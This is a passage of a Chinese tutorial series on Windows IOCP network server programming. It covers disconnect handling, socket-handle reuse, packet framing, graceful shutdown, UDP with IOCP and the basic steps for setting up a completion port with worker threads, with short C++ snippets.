ERROR_SEM_TIMEOUT （信号灯超时）错误。 5. 如何处理 这里要注意小猪的IOCP源码有个错误，因为所有投递到此socket的IOContext都会返回（包括RecvIOContext和SendIOContext），小猪源码里把关闭时所有的IOContext所对应的SocketContext都会回收一次，资源重复释放，直接挂掉。所以，我们只需要在RecvContext里释放对应的SocketContext资源即可，如果判断是SendIOContext，就不能再处理了。对了，别忘了释放掉自身IOContext资源。还有一点非常注意，不管什么类型的断开，服务端必须要调用一次closesocket，否则资源会一直占用（亲测）！在我的源码里处理断开有点麻烦，除了要注意上面的以外，还有一点： GetQueuedCompletionStatus返回的RecvIOContext，只是会调用closesocket且给业务工作线程发送一个disconnect事件，并不会释放SocketContext资源，这是因为我自己的业务里，SocketContext还保存了一个客户数据指针，所以业务处理完毕前不能释放，只有业务线程收到disconnect事件后，再去释放SocketContext资源。否则，会产生野指针问题。如何标志每一个连接（SocketContext） 这个问题也是非常容易忽略，出现概率也比较小，但是不能不注意。如果你的工程中，处理各种IO和SocketContext的线程和业务线程是同一个，且其他线程不会使用某个SocketContext时，则不用担心这个问题，因为你永远都不会给一个断开的socket发送信息（正常情况下），但如果不是同一个，则要注意了：上面说过一点，断开的socket会一直占用系统资源（包括socket句柄），你调用closesocket后才会释放掉，且会被系统重用！！！重用！！！重用！！！问题就产生于这里，据我测试重用的概率是非常高的（有一次居然隔了三四个socket就会重用之前的句柄），举个例子比较容易懂：假设你的业务线程很慢，有一个客户断开了，处理客户端开的线程非常快速的检测到并closesocket掉了，然后又新连接进来N个socket，正好占用了前面close掉的socket句柄，这时你的某个业务线程才开始处理之前客户的一些业务代码，处理完毕后会给此Socket发送结果。但此socket已经非彼socket了，你给一个无效的socket发送数据还好，系统顶多给你个ERROR，你给一个陌生的socket发送陌生的数据，又是一个大失误，问题你还不知道错误在哪里，根本无法找到！所以解决这个问题的方法是，你给每个SocketContext设置一个类似Cookie一样的东西，一般会想到GUID，但我的项目里用了一个自增uint类型的值，这也够用了，每次业务线程发送数据时只要携带这个唯一的Cookie，而IOCP进行Send时对队列中已存在的SocketContext的Cookie进行比较，一致时发送即可。粘包处理–包结构定义 这个问题其实不难，因为TCP是基于流的，系统收到的数据有可能经过优化，几个包的数据粘在一起，或者一个包分了几次才收到，所以要自己定义一个数据结构。我没有把粘包处理代码放在IOCP核心代码里，这样大家可以根据自己的喜好去定义包的格式。大家可以参考我定义的格式： 包识别码 | 包Flag | 包数据长度 | 包数据 包识别码：只有匹配到这个识别码，才表示这是个有效包。包Flag：相当于包的类型，我自己定义了几种：系统包、加密包、通信包、房间处理包、业务包等等。包数据长度：保存了后面包的数据长度。包数据：具体的数据（可能是加密的）。有了这个结构体，自然就很容易把粘包分开了。只是具体写代码时，要注意跳过无效的数据，还要注意包实际数据长度不够时，要把数据保存至缓冲区等待下一次数据的到来。 ※（二）：几个重要问题分析（下）[17] ※如何给IOCP工作线程发送自定义消息并处理 除了前面讲的投递三种IOContext都会从完成队列中返回（GetQueuedCompletionStatus），咱也可以投递自己的数据，让工作线程从队列中取出去处理，一般也没什么让工作线程去处理的，但要完美的关闭IOCP时还得用一下。给完成队列投递事件用PostQueuedCompletionStatus，参数和GetQueuedCompletionStatus的参数一一对应。具体可以看小猪的例程。有一点，小猪的例程里认为GetQueuedCompletionStatus有可能会出问题而多消耗一个退出事件（hShutdownEvent），所以在循环时用一个hShuntdownEvent来确保工作线程退出，但我个人觉得不好，因为这样会导致队列中剩余事件没有被梳理，所以只要咱把程序流程做对了，就不会有问题。系统从队列中取到我们投递的IOContext时，GetQueuedCompletionStatus的第2、3、4参数都有值，第2个参数是dwBytesTransfered，表示传输的字节数；第3个参数是我们在给Socket绑定完成端口时传递的参数，也就是SocketContext指针，在CreateIoCompletionPort的第3个参数时传递进去的；第4个参数就是我们投递的IOContext时都会携带一个overlapped，比如WSARecv的第6个参数，包含了IOContext结构体。所以我们在PostQueuedCompletionStatus时，只要让第3个或第4个值为NULL即可，表示这是我们自定义的事件（个人推荐还是让第3个参数为NULL），其他两个参数表示具体的自定义事件类型和值就好了。另外特别注意，咱多次调用PostQueuedCompletionStatus时是将事件发送到了完成端口队列中，取出时也是按队列方式先进先出的，但因为线程切换的不确定性，任务的执行仍然时不确定的，当初我就遇到过这种问题，这也是为什么不能在一个Socket上投递多个WSARecv来接收数据的重要原因。 ※关于Accpet时客户端附带第一组数据的说明 我们在使用AcceptEx时，第4个参数如果不为0，那么建立连接时还得等待客户端发送第一组数据，AcceptIOContext才能从完成端口队列中返回。而且对应的，你还得在GetAcceptExSockAddrs的第2个参数也要修改，两个值要设置为一样的。有个问题是，咱设置的这个值，只是表示最大能接受的字节数，你真正发送数据时不能超过这个值，否则会覆盖掉后续的数据（有客户机的IP和端口数据），而且！！！这个函数不会返回真正收到数据的长度，这就麻烦了，首先你得发送一个固定格式或固定长度的数据才行，还有，你得确定这个数据没有分批发送，要一次性收到，因为AcceptEx也不是等数据满了才返回，哪怕你发送1个字节，它也会返回的。基于上述分析，个人推荐还是关闭为好（置为0），建立连接后AcceptEx立即返回。 ※关于更优雅的关闭IOCP 就像小猪说的，一定要优雅的关闭IOCP，别退出时弹出一个无响应或者报错，会显得很low，更何况如果暴力关闭，会导致很多存在于队列中的IOContext、业务数据都没有处理，这也会导致一些无法预期的问题。首先是IOCP工作线程的关闭，小猪的文章也说的比较全，但是小猪因为在GetQueuedCompletionStatus前使用了hShutdownEvent，可能工作线程在队列中还有数据没处理时就退出了，所以我补充一下：Set关闭事件后，如果有Watch线程（心跳线程），先等待Watch线程结束；然后Close所有的Socket，让所有投递到队列中的Post和Recv的IOContext都返回（这些返回的IOContext会给业务线程投递关闭事件），然后给完成队列中投递退出事件（自定义事件）并等待所有线程退出（这样才会保证退出事件排在所有事件的后面），等所有工作线程返回后，就说明完成队列中的任务就真的空了。但是这样还没完！完成队列空了，业务线程并没有空，它还有一堆事件需要处理（比如所有的客户Close事件），说不定还得写数据库，不能这样随便退出，所以还得在最后，给业务线程发送一个退出事件，排在所有业务事件的最后（我用Qt实现方式是QMetaObject::invokeMethod调用Stop函数，而Stop函数用来关闭数据库、日志等），所有业务处理完毕后，最后再释放所有资源（包括释放Watch线程句柄、工作线程句柄、完成端口句柄、关闭ListenSocket、释放所有SocketContext和IOContext资源等）。真麻烦啊，我还是直接exit(0)吧，哈哈哈。 ※（三）：开发UDP的IOCP[18] UDP和TCP不同，后者面向连接的，而前者并不需要连接，所以去掉了一个很重要的数据结构：SocketContext，代码也比TCP的简单很多，经过实际测试，也有一些坑需要跳一下，这里会一一说明。 UDP和TCP区别 深入过协议的人应该很清楚，但我们只需要知道，TCP是面向连接的，基于数据流，会确保接收方收到的数据的顺序和正确性；而UDP是网络报文，报文是一个一个的发送，接收方收到的数据可能是乱序或丢失的（但收到的肯定是正确的，因为IP层会进行校验，如果错误直接丢掉）。优缺点也很明显，大体上说就是TCP消耗的资源比较多，使用起来稍微麻烦些（因为还有很多其他的功能），但不用咱来保证数据的一致性和流量控制等。UDP轻量、快速，使用简单，但根据需要可能要由咱来编写数据包的重组、重发等。根据特性，TCP适用于文本传输、文件传输、数据传输等不能有差错的地方，而UDP适用于实时视频聊天、语音聊天这种对数据一致性不是特别高的地方（缺一帧多一帧都无所谓那种）。 2. UDP报文长度 虽说协议中对UDP报文长度没什么要求，但实际使用时为了降低报文丢失率，我们尽可能让报文长度缩短，因为发送时IP层会对数据包进行拆分，收到时会进行重组，如果报文太大，IP层拆分的数据包如果有一个出错，就会把整个报文都丢掉了。所以，如果是局域网传输，UDP报文尽量设置为2500-8-20=2472字节，如果是Internet传输，尽量设置为576-8-20=548字节内。 3. IOContext结构体 因为UDP不会建立连接，所以TCP中的SocketContext结构体就用不到了，所以IOContext结构体就至关重要了，这里需要修改一下，我们的IOContext还得保存报文的IP和Port。同时去掉的还有AcceptIOContext，我们直接投递RecvIOContext就能收到数据，不需要投递AcceptIOContext。 4. 发送和接收 这部分我就不详细说了，把TCP的WSASend和WSARecv换成WSASendTo和WSARecvFrom即可，比TCP多了两个参数：用来接收的IP和Port（这两个再IOContext结构体内定义过了）。 Send也没那么复杂了，直接调用WSASendTo投递即可，不用关心什么多线程、发送乱序，反正都一样，哈哈~ 5. 初始化 WSASocket(AF_INET, SOCK_DGRAM,IPPROTO_IP,NULL,0,WSA_FLAG_OVERLAPPED); 把流换成报文。 6. 其他 因为没有Socket，所以只需要投递一定量的RecvIOContext，关闭时回收；SendIOContext返回时，用完数据回收即可。 就这么多，注意一下就行，比TCP简单的多的多。 ※完成端口(CompletionPort)详解 - 手把手教你玩转网络编程系列之三[19] 一． 完成端口的优点 我想只要是写过或者想要写C/S模式网络服务器端的朋友，都应该或多或少的听过完成端口的大名吧，完成端口会充分利用Windows内核来进行I/O的调度，是用于C/S通信模式中性能最好的网络通信模型，没有之一；甚至连和它性能接近的通信模型都没有。 完成端口和其他网络通信方式最大的区别在哪里呢？ (1) 首先，如果使用“同步”的方式来通信的话，这里说的同步的方式就是说所有的操作都在一个线程内顺序执行完成，这么做缺点是很明显的：因为同步的通信操作会阻塞住来自同一个线程的任何其他操作，只有这个操作完成了之后，后续的操作才可以完成；一个最明显的例子就是咱们在MFC的界面代码中，直接使用阻塞Socket调用的代码，整个界面都会因此而阻塞住没有响应！所以我们不得不为每一个通信的Socket都要建立一个线程，多麻烦？这不坑爹呢么？所以要写高性能的服务器程序，要求通信一定要是异步的。 (2) 各位读者肯定知道，可以使用使用“同步通信(阻塞通信)+多线程”的方式来改善(1)的情况，那么好，想一下，我们好不容易实现了让服务器端在每一个客户端连入之后，都要启动一个新的Thread和客户端进行通信，有多少个客户端，就需要启动多少个线程，对吧；但是由于这些线程都是处于运行状态，所以系统不得不在所有可运行的线程之间进行上下文的切换，我们自己是没啥感觉，但是CPU却痛苦不堪了，因为线程切换是相当浪费CPU时间的，如果客户端的连入线程过多，这就会弄得CPU都忙着去切换线程了，根本没有多少时间去执行线程体了，所以效率是非常低下的，承认坑爹了不？ (3) 而微软提出完成端口模型的初衷，就是为了解决这种&quot;one-thread-per-client&quot;的缺点的，它充分利用内核对象的调度，只使用少量的几个线程来处理和客户端的所有通信，消除了无谓的线程上下文切换，最大限度的提高了网络通信的性能，这种神奇的效果具体是如何实现的请看下文。 完成端口被广泛的应用于各个高性能服务器程序上，例如著名的Apache….如果你想要编写的服务器端需要同时处理的并发客户端连接数量有数百上千个的话，那不用纠结了，就是它了。 二． 完成端口程序的运行演示 我们可以发现一个令人惊讶的结果，采用了完成端口的Server程序(蓝色横线所示)所占用的CPU才为 3.82%，整个运行过程中的峰值也没有超过4%，是相当气定神闲的……哦，对了，这还是在Debug环境下运行的情况，如果采用Release方式执行，性能肯定还会更高一些，除此以外，在UI上显示信息也很大成都上影响了性能。 相反采用了多个并发线程的Client程序(紫色横线所示)居然占用的CPU高达11.53%，甚至超过了Server程序的数倍…… 其实无论是哪种网络操模型，对于内存占用都是差不多的，真正的差别就在于CPU的占用，其他的网络模型都需要更多的CPU动力来支撑同样的连接数据。 虽然这远远算不上服务器极限压力测试，但是从中也可以看出来完成端口的实力，而且这种方式比纯粹靠多线程的方式实现并发资源占用率要低得多。 三． 完成端口的相关概念 在开始编码之前，我们先来讨论一下和完成端口相关的一些概念，如果你没有耐心看完这段大段的文字的话，也可以跳过这一节直接去看下下一节的具体实现部分，但是这一节中涉及到的基本概念你还是有必要了解一下的，而且你也更能知道为什么有那么多的网络编程模式不用，非得要用这么又复杂又难以理解的完成端口呢？？也会坚定你继续学习下去的信心_ 3.1 异步通信机制及其几种实现方式的比较 我们从前面的文字中了解到，高性能服务器程序使用异步通信机制是必须的。 而对于异步的概念，为了方便后面文字的理解，这里还是再次简单的描述一下： 异步通信就是在咱们与外部的I/O设备进行打交道的时候，我们都知道外部设备的I/O和CPU比起来简直是龟速，比如硬盘读写、网络通信等等，我们没有必要在咱们自己的线程里面等待着I/O操作完成再执行后续的代码，而是将这个请求交给设备的驱动程序自己去处理，我们的线程可以继续做其他更重要的事情，大体的流程如下图所示: 我可以从图中看到一个很明显的并行操作的过程，而“同步”的通信方式是在进行网络操作的时候，主线程就挂起了，主线程要等待网络操作完成之后，才能继续执行后续的代码，就是说要末执行主线程，要末执行网络操作，是没法这样并行的； “异步”方式无疑比 “阻塞模式+多线程”的方式效率要高的多，这也是前者为什么叫“异步”，后者为什么叫“同步”的原因了，因为不需要等待网络操作完成再执行别的操作。 而在Windows中实现异步的机制同样有好几种，而这其中的区别，关键就在于图1中的最后一步“通知应用程序处理网络数据”上了，因为实现操作系统调用设备驱动程序去接收数据的操作都是一样的，关键就是在于如何去通知应用程序来拿数据。它们之间的具体区别我这里多讲几点，文字有点多，如果没兴趣深入研究的朋友可以跳过下一面的这一段，不影响的:) (1) 设备内核对象，使用设备内核对象来协调数据的发送请求和接收数据协调，也就是说通过设置设备内核对象的状态，在设备接收数据完成后，马上触发这个内核对象，然后让接收数据的线程收到通知，但是这种方式太原始了，接收数据的线程为了能够知道内核对象是否被触发了，还是得不停的挂起等待，这简直是根本就没有用嘛，太低级了，有木有？所以在这里就略过不提了，各位读者要是没明白是怎么回事也不用深究了，总之没有什么用。 (2) 事件内核对象，利用事件内核对象来实现I/O操作完成的通知，其实这种方式其实就是我以前写文章的时候提到的《基于事件通知的重叠I/O模型》，链接在这里，这种机制就先进得多，可以同时等待多个I/O操作的完成，实现真正的异步，但是缺点也是很明显的，既然用WaitForMultipleObjects()来等待Event的话，就会受到64个Event等待上限的限制，但是这可不是说我们只能处理来自于64个客户端的Socket，而是这是属于在一个设备内核对象上等待的64个事件内核对象，也就是说，我们在一个线程内，可以同时监控64个重叠I/O操作的完成状态，当然我们同样可以使用多个线程的方式来满足无限多个重叠I/O的需求，比如如果想要支持3万个连接，就得需要500多个线程…用起来太麻烦让人感觉不爽； (3) 使用APC( Asynchronous Procedure Call，异步过程调用)来完成，这个也就是我以前在文章里提到的《基于完成例程的重叠I/O模型》，链接在这里，这种方式的好处就是在于摆脱了基于事件通知方式的64个事件上限的限制，但是缺点也是有的，就是发出请求的线程必须得要自己去处理接收请求，哪怕是这个线程发出了很多发送或者接收数据的请求，但是其他的线程都闲着…，这个线程也还是得自己来处理自己发出去的这些请求，没有人来帮忙…这就有一个负载均衡问题，显然性能没有达到最优化。 (4) 完成端口，不用说大家也知道了，最后的压轴戏就是使用完成端口，对比上面几种机制，完成端口的做法是这样的：事先开好几个线程，你有几个CPU我就开几个，首先是避免了线程的上下文切换，因为线程想要执行的时候，总有CPU资源可用，然后让这几个线程等着，等到有用户请求来到的时候，就把这些请求都加入到一个公共消息队列中去，然后这几个开好的线程就排队逐一去从消息队列中取出消息并加以处理，这种方式就很优雅的实现了异步通信和负载均衡的问题，因为它提供了一种机制来使用几个线程“公平的”处理来自于多个客户端的输入/输出，并且线程如果没事干的时候也会被系统挂起，不会占用CPU周期，挺完美的一个解决方案，不是吗？哦，对了，这个关键的作为交换的消息队列，就是完成端口。 比较完毕之后，熟悉网络编程的朋友可能会问到，为什么没有提到WSAAsyncSelect或者是WSAEventSelect这两个异步模型呢，对于这两个模型，我不知道其内部是如何实现的，但是这其中一定没有用到Overlapped机制，就不能算作是真正的异步，可能是其内部自己在维护一个消息队列吧，总之这两个模式虽然实现了异步的接收，但是却不能进行异步的发送，这就很明显说明问题了，我想其内部的实现一定和完成端口是迥异的，并且，完成端口非常厚道，因为它是先把用户数据接收回来之后再通知用户直接来取就好了，而WSAAsyncSelect和WSAEventSelect之流只是会接收到数据到达的通知，而只能由应用程序自己再另外去recv数据，性能上的差距就更明显了。 最后，我的建议是，想要使用 基于事件通知的重叠I/O和基于完成例程的重叠I/O的朋友，如果不是特别必要，就不要去使用了，因为这两种方式不仅使用和理解起来也不算简单，而且还有性能上的明显瓶颈，何不就再努力一下使用完成端口呢？ 3.2 重叠结构(OVERLAPPED) 我们从上一小节中得知，要实现异步通信，必须要用到一个很风骚的I/O数据结构，叫重叠结构“Overlapped”，Windows里所有的异步通信都是基于它的，完成端口也不例外。 至于为什么叫Overlapped？Jeffrey Richter的解释是因为“执行I/O请求的时间与线程执行其他任务的时间是重叠(overlapped)的”，从这个名字我们也可能看得出来重叠结构发明的初衷了，对于重叠结构的内部细节我这里就不过多的解释了，就把它当成和其他内核对象一样，不需要深究其实现机制，只要会使用就可以了，想要了解更多重叠结构内部的朋友，请去翻阅Jeffrey Richter的《Windows via C/C++》 5th 的292页，如果没有机会的话，也可以随便翻翻我以前写的Overlapped的东西，不过写得比较浅显…… 这里我想要解释的是，这个重叠结构是异步通信机制实现的一个核心数据结构，因为你看到后面的代码你会发现，几乎所有的网络操作例如发送/接收之类的，都会用WSASend()和WSARecv()代替，参数里面都会附带一个重叠结构，这是为什么呢？因为重叠结构我们就可以理解成为是一个网络操作的ID号，也就是说我们要利用重叠I/O提供的异步机制的话，每一个网络操作都要有一个唯一的ID号，因为进了系统内核，里面黑灯瞎火的，也不了解上面出了什么状况，一看到有重叠I/O的调用进来了，就会使用其异步机制，并且操作系统就只能靠这个重叠结构带有的ID号来区分是哪一个网络操作了，然后内核里面处理完毕之后，根据这个ID号，把对应的数据传上去。 你要是实在不理解这是个什么玩意，那就直接看后面的代码吧，慢慢就明白了…… 3.3 完成端口(CompletionPort) 对于完成端口这个概念，我一直不知道为什么它的名字是叫“完成端口”，我个人的感觉应该叫它“完成队列”似乎更合适一些，总之这个“端口”和我们平常所说的用于网络通信的“端口”完全不是一个东西，我们不要混淆了。 首先，它之所以叫“完成”端口，就是说系统会在网络I/O操作“完成”之后才会通知我们，也就是说，我们在接到系统的通知的时候，其实网络操作已经完成了，就是比如说在系统通知我们的时候，并非是有数据从网络上到来，而是来自于网络上的数据已经接收完毕了；或者是客户端的连入请求已经被系统接入完毕了等等，我们只需要处理后面的事情就好了。 各位朋友可能会很开心，什么？已经处理完毕了才通知我们，那岂不是很爽？其实也没什么爽的，那是因为我们在之前给系统分派工作的时候，都嘱咐好了，我们会通过代码告诉系统“你给我做这个做那个，等待做完了再通知我”，只是这些工作是做在之前还是之后的区别而已。 其次，我们需要知道，所谓的完成端口，其实和HANDLE一样，也是一个内核对象，虽然Jeff Richter吓唬我们说：“完成端口可能是最为复杂的内核对象了”，但是我们也不用去管他，因为它具体的内部如何实现的和我们无关，只要我们能够学会用它相关的API把这个完成端口的框架搭建起来就可以了。我们暂时只用把它大体理解为一个容纳网络通信操作的队列就好了，它会把网络操作完成的通知，都放在这个队列里面，咱们只用从这个队列里面取就行了，取走一个就少一个…。 关于完成端口内核对象的具体更多内部细节我会在后面的“完成端口的基本原理”一节更详细的和朋友们一起来研究，当然，要是你们在文章中没有看到这一节的话，就是说明我又犯懒了没写…在后续的文章里我会补上。这里就暂时说这么多了，到时候我们也可以看到它的机制也并非有那么的复杂，可能只是因为操作系统其他的内核对象相比较而言实现起来太容易了吧_ 四． 使用完成端口的基本流程 说了这么多的废话，大家都等不及了吧，我们终于到了具体编码的时候了。 使用完成端口，说难也难，但是说简单，其实也简单 ---- 又说了一句废话=。= 大体上来讲，使用完成端口只用遵循如下几个步骤： (1) 调用 CreateIoCompletionPort() 函数创建一个完成端口，而且在一般情况下，我们需要且只需要建立这一个完成端口，把它的句柄保存好，我们今后会经常用到它…… (2) 根据系统中有多少个处理器，就建立多少个工作者(为了醒目起见，下面直接说Worker)线程，这几个线程是专门用来和客户端进行通信的，目前暂时没什么工作； (3) 下面就是接收连入的Socket连接了，这里有两种实现方式：一是和别的编程模型一样，还需要启动一个独立的线程，专门用来accept客户端的连接请求；二是用性能更高更好的异步AcceptEx()请求，因为各位对accept用法应该非常熟悉了，而且网上资料也会很多，所以为了更全面起见，本文采用的是性能更好的AcceptEx，至于两者代码编写上的区别，我接下来会详细的讲。 (4) 每当有客户端连入的时候，我们就还是得调用CreateIoCompletionPort()函数，这里却不是新建立完成端口了，而是把新连入的Socket(也就是前面所谓的设备句柄)，与目前的完成端口绑定在一起。 至此，我们其实就已经完成了完成端口的相关部署工作了，嗯，是的，完事了，后面的代码里我们就可以充分享受完成端口带给我们的巨大优势，坐享其成了，是不是很简单呢？ (5) 例如，客户端连入之后，我们可以在这个Socket上提交一个网络请求，例如WSARecv()，然后系统就会帮咱们乖乖的去执行接收数据的操作，我们大可以放心的去干别的事情了； (6) 而此时，我们预先准备的那几个Worker线程就不能闲着了， 我们在前面建立的几个Worker就要忙活起来了，都需要分别调用GetQueuedCompletionStatus() 函数在扫描完成端口的队列里是否有网络通信的请求存在(例如读取数据，发送数据等)，一旦有的话，就将这个请求从完成端口的队列中取回来，继续执行本线程中后面的处理代码，处理完毕之后，我们再继续投递下一个网络通信的请求就OK了，如此循环。 关于完成端口的使用步骤，用文字来表述就是这么多了，很简单吧？如果你还是不理解，我再配合一个流程图来表示一下： 当然，我这里假设你已经对网络编程的基本套路有了解了，所以略去了很多基本的细节，并且为了配合朋友们更好的理解我的代码，在流程图我标出了一些函数的名字，并且画得非常详细。 另外需要注意的是由于对于客户端的连入有两种方式，一种是普通阻塞的accept，另外一种是性能更好的AcceptEx，为了能够方面朋友们从别的网络编程的方式中过渡，我这里画了两种方式的流程图，方便朋友们对比学习，图a是使用accept的方式，当然配套的源代码我默认就不提供了，如果需要的话，我倒是也可以发上来；图b是使用AcceptEx的，并配有配套的源码。 采用accept方式的流程示意图如下： 采用AcceptEx方式的流程示意图如下： 两个图中最大的相同点是什么？是的，最大的相同点就是主线程无所事事，闲得蛋疼…… 为什么呢？因为我们使用了异步的通信机制，这些琐碎重复的事情完全没有必要交给主线程自己来做了，只用在初始化的时候和Worker线程交待好就可以了，用一句话来形容就是，主线程永远也体会不到Worker线程有多忙，而Worker线程也永远体会不到主线程在初始化建立起这个通信框架的时候操了多少的心…… 图a中是由 _AcceptThread()负责接入连接，并把连入的Socket和完成端口绑定，另外的多个_WorkerThread()就负责监控完成端口上的情况，一旦有情况了，就取出来处理，如果CPU有多核的话，就可以多个线程轮着来处理完成端口上的信息，很明显效率就提高了。 图b中最明显的区别，也就是AcceptEx和传统的accept之间最大的区别，就是取消了阻塞方式的accept调用，也就是说，AcceptEx也是通过完成端口来异步完成的，所以就取消了专门用于accept连接的线程，用了完成端口来进行异步的AcceptEx调用；然后在检索完成端口队列的Worker函数中，根据用户投递的完成操作的类型，再来找出其中的投递的Accept请求，加以对应的处理。 读者一定会问，这样做的好处在哪里？为什么还要异步的投递AcceptEx连接的操作呢？ 首先，我可以很明确的告诉各位，如果短时间内客户端的并发连接请求不是特别多的话，用accept和AcceptEx在性能上来讲是没什么区别的。 按照我们目前主流的PC来讲，如果客户端只进行连接请求，而什么都不做的话，我们的Server只能接收大约3万-4万个左右的并发连接，然后客户端其余的连入请求就只能收到WSAENOBUFS (10055)了，因为系统来不及为新连入的客户端准备资源了。 需要准备什么资源？当然是准备Socket了……虽然我们创建Socket只用一行SOCKET s= socket(…) 这么一行的代码就OK了，但是系统内部建立一个Socket是相当耗费资源的，因为Winsock2是分层的机构体系，创建一个Socket需要到多个Provider之间进行处理，最终形成一个可用的套接字。总之，系统创建一个Socket的开销是相当高的，所以用accept的话，系统可能来不及为更多的并发客户端现场准备Socket了。 而AcceptEx比Accept又强大在哪里呢？是有三点： (1) 这个好处是最关键的，是因为AcceptEx是在客户端连入之前，就把客户端的Socket建立好了，也就是说，AcceptEx是先建立的Socket，然后才发出的AcceptEx调用，也就是说，在进行客户端的通信之前，无论是否有客户端连入，Socket都是提前建立好了；而不需要像accept是在客户端连入了之后，再现场去花费时间建立Socket。如果各位不清楚是如何实现的，请看后面的实现部分。 (2) 相比accept只能阻塞方式建立一个连入的入口，对于大量的并发客户端来讲，入口实在是有点挤；而AcceptEx可以同时在完成端口上投递多个请求，这样有客户端连入的时候，就非常优雅而且从容不迫的边喝茶边处理连入请求了。 (3) AcceptEx还有一个非常体贴的优点，就是在投递AcceptEx的时候，我们还可以顺便在AcceptEx的同时，收取客户端发来的第一组数据，这个是同时进行的，也就是说，在我们收到AcceptEx完成的通知的时候，我们就已经把这第一组数据接完毕了；但是这也意味着，如果客户端只是连入但是不发送数据的话，我们就不会收到这个AcceptEx完成的通知……这个我们在后面的实现部分，也可以详细看到。 最后，各位要有一个心里准备，相比accept，异步的AcceptEx使用起来要麻烦得多…… 五． 完成端口的实现详解 又说了一节的废话，终于到了该动手实现的时候了…… 这里我把完成端口的详细实现步骤以及会涉及到的函数，按照出现的先后步骤，都和大家详细的说明解释一下，当然，文档中为了让大家便于阅读，这里去掉了其中的错误处理的内容，当然，这些内容在示例代码中是会有的。 【第一步】创建一个完成端口 首先，我们先把完成端口建好再说。 我们正常情况下，我们需要且只需要建立这一个完成端口，代码很简单: HANDLE m_hIOCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0 ); 呵呵，看到CreateIoCompletionPort()的参数不要奇怪，参数就是一个INVALID，一个NULL，两个0…，说白了就是一个-1，三个0……简直就和什么都没传一样，但是Windows系统内部却是好一顿忙活，把完成端口相关的资源和数据结构都已经定义好了(在后面的原理部分我们会看到，完成端口相关的数据结构大部分都是一些用来协调各种网络I/O的队列)，然后系统会给我们返回一个有意义的HANDLE，只要返回值不是NULL，就说明建立完成端口成功了，就这么简单，不是吗？ 有的时候我真的很赞叹Windows API的封装，把很多其实是很复杂的事整得这么简单…… 至于里面各个参数的具体含义，我会放到后面的步骤中去讲，反正这里只要知道创建我们唯一的这个完成端口，就只是需要这么几个参数。 但是对于最后一个参数 0，我这里要简单的说两句，这个0可不是一个普通的0，它代表的是NumberOfConcurrentThreads，也就是说，允许应用程序同时执行的线程数量。当然，我们这里为了避免上下文切换，最理想的状态就是每个处理器上只运行一个线程了，所以我们设置为0，就是说有多少个处理器，就允许同时多少个线程运行。 因为比如一台机器只有两个CPU（或者两个核心），如果让系统同时运行的线程多于本机的CPU数量的话，那其实是没有什么意义的事情，因为这样CPU就不得不在多个线程之间执行上下文切换，这会浪费宝贵的CPU周期，反而降低的效率，我们要牢记这个原则。 【第二步】根据系统中CPU核心的数量建立对应的Worker线程 我们前面已经提到，这个Worker线程很重要，是用来具体处理网络请求、具体和客户端通信的线程，而且对于线程数量的设置很有意思，要等于系统中CPU的数量，那么我们就要首先获取系统中CPU的数量，这个是基本功，我就不多说了，代码如下： 1234SYSTEM_INFO si;GetSystemInfo(&amp;si);int m_nProcessors = si.dwNumberOfProcessors; 啊，等等！各位没发现什么问题么？为什么我8核的CPU却启动了16个线程？这个不是和我们第二步中说的原则自相矛盾了么？ 哈哈，有个小秘密忘了告诉各位了，江湖上都流传着这么一个公式，就是： 我们最好是建立CPU核心数量*2那么多的线程，这样更可以充分利用CPU资源，因为完成端口的调度是非常智能的，比如我们的Worker线程有的时候可能会有Sleep()或者WaitForSingleObject()之类的情况，这样同一个CPU核心上的另一个线程就可以代替这个Sleep的线程执行了；因为完成端口的目标是要使得CPU满负荷的工作。 这里也有人说是建立 CPU“核心数量 * 2 +2”个线程，我想这个应该没有什么太大的区别，我就是按照我自己的习惯来了。 然后按照这个数量，来启动这么多个Worker线程就好可以了，接下来我们开始下一个步骤。 什么？Worker线程不会建？ Worker线程和普通线程是一样一样一样的啊~~~，代码大致上如下： 12345678// 根据CPU数量，建立*2的线程m_nThreads = 2 * m_nProcessors;HANDLE* m_phWorkerThreads = new HANDLE[m_nThreads];for (int i = 0; i &lt; m_nThreads; i++)&#123; m_phWorkerThreads[i] = ::CreateThread(0, 0, _WorkerThread, …);&#125; 其中，_WorkerThread是Worker线程的线程函数，线程函数的具体内容我们后面再讲。 【第三步】创建一个用于监听的Socket，绑定到完成端口上，然后开始在指定的端口上监听连接请求 最重要的完成端口建立完毕了，我们就可以利用这个完成端口来进行网络通信了。 首先，我们需要初始化Socket，这里和通常情况下使用Socket初始化的步骤都是一样的，大约就是如下的这么几个过程(详情参照我代码中的LoadSocketLib()和InitializeListenSocket()，这里只是挑出关键部分)： 12345678910111213141516171819// 初始化Socket库WSADATA wsaData;WSAStartup(MAKEWORD(2,2), &amp;wsaData);//初始化Socketstruct sockaddr_in ServerAddress;// 这里需要特别注意，如果要使用重叠I/O的话，这里必须要使用WSASocket来初始化Socket// 注意里面有个WSA_FLAG_OVERLAPPED参数SOCKET m_sockListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);// 填充地址结构信息ZeroMemory((char *)&amp;ServerAddress, sizeof(ServerAddress));ServerAddress.sin_family = AF_INET;// 这里可以选择绑定任何一个可用的地址，或者是自己指定的一个IP地址 //ServerAddress.sin_addr.s_addr = htonl(INADDR_ANY); ServerAddress.sin_addr.s_addr = inet_addr(“你的IP”); ServerAddress.sin_port = htons(11111); // 绑定端口if (SOCKET_ERROR == bind(m_sockListen, (struct sockaddr *) &amp;ServerAddress, sizeof(ServerAddress))) // 开始监听listen(m_sockListen,SOMAXCONN)) 需要注意的地方有两点： (1) 想要使用重叠I/O的话，初始化Socket的时候一定要使用WSASocket并带上WSA_FLAG_OVERLAPPED参数才可以(只有在服务器端需要这么做，在客户端是不需要的)； (2) 注意到listen函数后面用的那个常量SOMAXCONN了吗？这个是在微软在WinSock2.h中定义的，并且还附赠了一条注释，Maximum queue length specifiable by listen.，所以说，不用白不用咯_ 接下来有一个非常重要的动作：既然我们要使用完成端口来帮我们进行监听工作，那么我们一定要把这个监听Socket和完成端口绑定才可以的吧： 如何绑定呢？同样很简单，用 CreateIoCompletionPort()函数。 等等！大家没觉得这个函数很眼熟么？是的，这个和前面那个创建完成端口用的居然是同一个API！但是这里这个API可不是用来建立完成端口的，而是用于将Socket和以前创建的那个完成端口绑定的，大家可要看准了，不要被迷惑了，因为他们的参数是明显不一样的，前面那个的参数是一个-1，三个0，太好记了… 说实话，我感觉微软应该把这两个函数分开，弄个 CreateNewCompletionPort() 